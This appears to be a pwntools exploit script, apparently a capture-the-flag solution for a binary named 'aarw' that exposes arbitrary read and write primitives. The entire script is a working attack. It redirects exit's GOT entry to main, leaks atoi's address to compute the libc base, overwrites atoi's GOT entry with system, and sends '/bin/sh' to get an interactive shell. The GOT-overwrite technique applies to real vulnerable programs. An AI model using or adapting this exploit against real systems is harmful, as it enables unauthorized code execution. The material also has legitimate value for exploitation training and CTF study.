from pwn import *

bin_file = './aarw'
context(os = 'linux', arch = 'amd64')

binf = ELF(bin_file)
addr_got_atoi = binf.got['atoi']
addr_got_exit = binf.got['exit']
addr_main     = binf.functions['main'].address

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
offset_libc_atoi = libc.functions['atoi'].address
print(hex(offset_libc_atoi))

def aar(conn, read_addr):
    conn.sendlineafter(b'>> ', b'1')
    conn.sendlineafter(b'read >> ', hex(read_addr))
    conn.recvuntil(b' : ')
    res = int(conn.recvuntil(b'\n'), 16)
    return res

def aaw(conn, written_addr, write_addr):
    conn.sendlineafter(b'>> ', b'2')
    conn.sendlineafter(b'write >> ', hex(written_addr))
    conn.sendlineafter(b'value >> ', hex(write_addr))

def attack(conn):
    aaw(conn, addr_got_exit, addr_main)    
    addr_libc_atoi = aar(conn, addr_got_atoi)
    libc.address = addr_libc_atoi - offset_libc_atoi
    info('addr_libc_baseaddr = 0x{:08x}'.format(libc.address))
    addr_libc_system = libc.functions['system'].address
    aaw(conn, addr_got_atoi, addr_libc_system)
    conn.sendline('/bin/sh')

def main():
    conn = process(bin_file)
    attack(conn)
    conn.interactive()

if __name__ == '__main__':
    main()

